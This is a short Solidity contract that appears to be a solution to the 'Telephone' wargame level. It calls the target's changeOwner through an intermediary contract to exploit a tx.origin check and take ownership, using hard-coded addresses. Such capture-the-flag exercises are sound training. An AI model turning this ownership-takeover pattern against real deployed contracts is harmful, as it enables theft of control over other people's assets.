// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
  function changeOwner(address) public {}
}

contract Solve {
    Telephone tp;
    address owner = 0xD13Fc9225e1E6a56Dabb76Efd19e72BEdd8a8663;
    address ins = 0x3d7e3BA6E2434Def5FD36B509D7a3FB2505D8438;
     function Existing() public {
        tp = Telephone(ins);
    }


    function changeOwner() public {
        tp.changeOwner(owner);
    }
}